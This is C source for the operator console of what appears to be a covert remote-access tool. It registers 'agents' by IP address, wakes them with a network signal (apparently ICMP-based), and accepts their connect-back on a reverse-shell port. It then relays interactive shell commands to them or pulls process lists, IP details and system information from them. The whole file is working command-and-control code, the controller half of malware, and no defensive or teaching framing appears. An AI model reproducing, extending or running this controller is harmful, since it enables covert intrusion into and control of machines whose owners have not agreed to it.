#include <stdio.h>
#include <stdlib.h>
#include <poll.h>
#include <fcntl.h>


#include "../headers/factory.h"
#include "../headers/cli.h"
// #include "../headers/network_helper.h"
// #include "../headers/listener.h"
#include "../headers/agent_commands.h"

struct listener *cli_listener;
struct agent *active_agent;
struct agent **available_agents;
int available_agents_length = 0;
struct factory *commands;
int running = 1;


/////////////////////////////////////////////////// timeout logic

int is_timeout = 0;

void raise_timeout_flag() {
    is_timeout = 1;
}

void start_timeout(int seconds) {
    is_timeout = 0; // reseting timer
    signal(SIGALRM, raise_timeout_flag);
    alarm(seconds);
}

void stop_timeout() {
    alarm(0);
}


/////////////////////////////////////////////////// polling logic


struct pollfd *poll_fds;
int poll_fds_length = 0;


int add_poll_fd(int fd) {
    // create pollfd for the new download to be monitored
    struct pollfd poll_fd;
    poll_fd.fd = fd;
    poll_fd.events = POLLIN;

    // make more space for the new pollfd and add it to the poll_fds array
    poll_fds = realloc(poll_fds, ++poll_fds_length * sizeof(struct pollfd));
    poll_fds[poll_fds_length - 1] = poll_fd; // add in the last index

    return poll_fds_length - 1;
}


void remove_poll_fd_by_idx(int idx) {
    struct download *download_to_update; // update pollfd
    struct download *download_to_remove; // make pollfd NULL

    poll_fds[idx] = poll_fds[poll_fds_length - 1];
    poll_fds_length--;
}


void remove_poll_fd_by_fd(int fd) {
    for (size_t i = 0; i < poll_fds_length; i++)
    {
        if (poll_fds[i].fd == fd) {
            remove_poll_fd_by_idx(i);
        }
    }
}


/////////////////////////////////////////////////// cli core


void print_banner() {
    printf("%s", BASE_BANNER);
    printf("\n\n");
    printf("[*] run 'help' to see commands");
    printf("\n\n\n\n");
}


void print_prompt() {
    printf("%s", PROMPT);

    if (active_agent != NULL) {
        printf("\\%s", active_agent->name);
    }

    printf("> ");
}


char **split_command(char * command, int * argc) {
    char ** argv;
    char *arg = malloc(COMMAND_LENGTH);
    *argc = 0;
    int cur_arg_char_idx = 0;
    int command_char_idx = 0;

    argv = malloc(sizeof(char*) * (*argc + 1));

    while (command[command_char_idx] != '\n' && command[command_char_idx] != '\0')
    {
        if (command[command_char_idx] != ' ') {
            arg[cur_arg_char_idx++] = command[command_char_idx];
        } else {
            arg[cur_arg_char_idx] = '\0';
            argv[*argc] = arg;
            *argc = *argc + 1;
            cur_arg_char_idx = 0;
            arg = malloc(COMMAND_LENGTH);
            argv = realloc(argv, sizeof(char*) * (*argc + 1));
        }

        command_char_idx++;
    }

    arg[cur_arg_char_idx] = '\0';
    argv[*argc] = arg;
    *argc = *argc + 1;

    return argv;
}


void get_command_args(int *argc, char **out_argv[]) {
    char command[COMMAND_LENGTH];

    print_prompt();
    fgets(command, COMMAND_LENGTH, stdin);
    *out_argv = split_command(command, argc);
}


/////////////////////////////////////////////////// cli commands


void help_command(int argc, char *argv[]) {
    printf("available commands: ");
    for (size_t i = 0; i < commands->len; i++)
    {
        printf("'%s'", commands->items[i].key);

        if (i + 1 < commands->len) {
            printf(", ");
        }
    }

    printf("\n");
}


void exit_command(int argc, char *argv[]) {
    running = 0;
}


void list_command(int argc, char *argv[]) {
    if (available_agents_length < 1){
        printf("no agents. use <%s> first.\n", ADD_CMD);
    } else {
        struct agent *cur_agent;

        for (size_t i = 0; i < available_agents_length; i++)
        {
            cur_agent = available_agents[i];
            printf("[%lx] %s %s\n", (i + 1), cur_agent->name, convert_addrinfo_to_ip(cur_agent->addr));
        }
    }
}


void add_command(int argc, char *argv[]) {
    if (argc < 3) {
        printf("usage: %s [agent name] [ip address]\n", ADD_CMD);
    } else {
        struct agent *new_agent = malloc(sizeof(struct agent));
        strcpy(new_agent->name, argv[1]);
        getaddrinfo_by_ip(argv[2], &new_agent->addr);
        available_agents = realloc(available_agents, sizeof(struct agent) * (available_agents_length + 1));
        available_agents[available_agents_length++] = new_agent;
    }
}


void remove_command(int argc, char *argv[]) {
    if (argc < 2) {
        printf("usage: %s [agent index]\n", REMOVE_CMD);
    } else {
        int agent_idx = atoi(argv[1]);

        if (agent_idx >= 1 && agent_idx <= available_agents_length) {
            if (active_agent == available_agents[agent_idx - 1]) {
                active_agent = NULL;
            }

            free(available_agents[agent_idx - 1]);
            available_agents[agent_idx - 1] = available_agents[--available_agents_length];
            available_agents = realloc(available_agents, available_agents_length * sizeof(struct agent));
        }
    }
}


void use_command(int argc, char *argv[]) {
    if (argc < 2) {
        printf("usage: %s [agent idx]\n", USE_CMD);
    } else {
        int agent_idx = atoi(argv[1]);

        if (agent_idx >= 1 && agent_idx <= available_agents_length) {
            active_agent = available_agents[agent_idx - 1];
        }
    }
}


void status_command(int argc, char *argv[]) {
    if (!active_agent) {
        printf("no active agent. use <%s> first\n", USE_CMD);
    } else {
        if (ping(active_agent->addr, 0) == -1) {
            printf("agent is inaccessible\n");
        } else {
            printf("agent is active\n");
        }
    }
}


typedef void (*message_handler)(char *);


void awake_agent(int command) {
    int socket_saved_flags = fcntl(cli_listener->sock_fd, F_GETFL); // save socket control flags
    fcntl(cli_listener->sock_fd, F_SETFL, O_NONBLOCK); // make listener nonblocking

    int connection;

    // discard any previous reduandent connections cuased by duplicate ICMP Replays
    while ((connection = wait_for_connection(cli_listener)) != -1) {
        close(connection);
    }

    // awake agent with correct signal
    signal_agent(active_agent->addr, command); // signal agent

    start_timeout(5);

    while ((connection = wait_for_connection(cli_listener)) == -1 && !is_timeout) {
        continue;
    }

    if (is_timeout) {
        printf("[!] agent didn't connect. please try again \n");
        return;
    }

    stop_timeout();

    fcntl(connection, F_SETFL, O_NONBLOCK);
    add_poll_fd(connection);

    int flag = 1; // is connection over or we got an exception

    // recv data from socket until agent closes the connection or we got timeout or we got error
    while (flag) {
        int event_count = poll(poll_fds, poll_fds_length, 5000);

        struct pollfd pollfd = poll_fds[0];
        if (event_count == 0 || pollfd.revents & POLLERR) {
            printf("[!] communication error occured. please try again\n");
            flag = 0;
        } else if (pollfd.revents & POLLIN) {
            char cmd_output[256];
            memset(cmd_output, '\0', sizeof(cmd_output));
            int bytes_read = read(connection, cmd_output, sizeof(cmd_output));

            if (!bytes_read) {
                flag = 0;
            } else {
                printf("%s", cmd_output);
            }
        }
    }

    remove_poll_fd_by_fd(connection);
    close(connection);

    fcntl(cli_listener->sock_fd, F_SETFL, socket_saved_flags & ~O_NONBLOCK); // make listener blocking again
}


void start_reverse_shell(int prefetch_cmd) {
    int socket_saved_flags = fcntl(cli_listener->sock_fd, F_GETFL); 
    fcntl(cli_listener->sock_fd, F_SETFL, O_NONBLOCK); // make listener nonblocking

    int connection;

    // discard any reduandent connections cuased by duplicate ICMP Replays
    while ((connection = wait_for_connection(cli_listener)) != -1) {
        close(connection);
    }

    // awake agent and signal to start reverse shell
    printf("[*] waiting for agent to connect...\n");
    signal_agent(active_agent->addr, prefetch_cmd); // signal agent

    start_timeout(5);

    while ((connection = wait_for_connection(cli_listener)) == -1 && !is_timeout) {
        continue;
    }

    if (is_timeout) {
        printf("[!] agent didn't connect. please try again \n");
        return;
    }

    stop_timeout();
    printf("[*] agent connected!\n\n");

    int saved_flags = fcntl(STDIN_FILENO, F_GETFL);

    fcntl(connection, F_SETFL, O_NONBLOCK);
    fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK);
    add_poll_fd(STDIN_FILENO);
    add_poll_fd(connection);

    int flag = 1;


    printf(">> ");
    fflush(stdout);

    while (flag) {
        int event_count = poll(poll_fds, poll_fds_length, -1);

        for (size_t poll_fd_idx = 0; poll_fd_idx < poll_fds_length; poll_fd_idx++)
        {
            struct pollfd cur_pollfd = poll_fds[poll_fd_idx];

            if (cur_pollfd.revents & POLLIN) {
                if (cur_pollfd.fd == STDIN_FILENO) {
                    char cmd[256];
                    memset(cmd, '\0', sizeof(cmd));
                    read(cur_pollfd.fd, cmd, sizeof(cmd));
                    send(connection, cmd, sizeof(cmd), 0);
                } else if (cur_pollfd.fd == connection) {
                    char cmd_output[256];
                    memset(cmd_output, '\0', sizeof(cmd_output));
                    int bytes_read = read(cur_pollfd.fd, cmd_output, sizeof(cmd_output));

                    if (!bytes_read) {
                        printf("\n[*] agent connection closed\n");
                        remove_poll_fd_by_fd(cur_pollfd.fd);
                        flag = 0;
                    } else {
                        printf("%s", cmd_output);
                        printf(">> ");
                        fflush(stdout);
                    }
                }
            }
        }
    }
    
    fcntl(STDIN_FILENO, F_SETFL, saved_flags & ~O_NONBLOCK);
    remove_poll_fd_by_fd(STDIN_FILENO);

    fcntl(cli_listener->sock_fd, F_SETFL, socket_saved_flags & ~O_NONBLOCK); // make listener blocking again
}


void shell_command(int argc, char *argv[]) {
    if (!active_agent) {
        printf("no active agent. use <%s> first\n", USE_CMD);
    } else {
        start_reverse_shell(AGENT_SHELL_CMD);
    }
}


void ip_command(int argc, char *argv[]) {
    if (!active_agent) {
        printf("no active agent. use <%s> first\n", USE_CMD);
    } else {
        awake_agent(AGENT_IP_CMD);
    }
}


void ps_command(int argc, char *argv[]) {
    if (!active_agent) {
        printf("no active agent. use <%s> first\n", USE_CMD);
    } else {
        awake_agent(AGENT_PS_CMD);
    }
}


void uname_command(int argc, char *argv[]) {
    if (!active_agent) {
        printf("no active agent. use <%s> first\n", USE_CMD);
    } else {
        awake_agent(AGENT_UNAME_CMD);
    }
}


void fill_commands_factory() {
    register_item(commands, HELP_CMD, help_command);
    register_item(commands, EXIT_CMD, exit_command);
    register_item(commands, LIST_CMD, list_command);
    register_item(commands, ADD_CMD, add_command);
    register_item(commands, REMOVE_CMD, remove_command);
    register_item(commands, USE_CMD, use_command);
    register_item(commands, STATUS_CMD, status_command);
    register_item(commands, SHELL_CMD, shell_command);
    register_item(commands, IP_CMD, ip_command);
    register_item(commands, PS_CMD, ps_command);
    register_item(commands, UNAME_CMD, uname_command);
}


/////////////////////////////////////////////////// start


void start() {
    char **argv;
    int argc;
    maker command_callback;

    print_banner();
    build_factory(&commands);
    fill_commands_factory();

    cli_listener = build_listener(REVERSE_SHELL_PORT);

    if (!cli_listener) {
        printf("[!] server can't start on port %d", REVERSE_SHELL_PORT);
        return;
    }

    while (running) {
        get_command_args(&argc, &argv);

        if (strcmp(argv[0], "") != 0) {
            command_callback = make(commands, argv[0]);
            if (!command_callback) {
                printf("command '%s' unknown\n", argv[0]);
            } else {
                command_callback(argc, argv);
            }
            free(argv);
        }
    }

    close(cli_listener->sock_fd);
}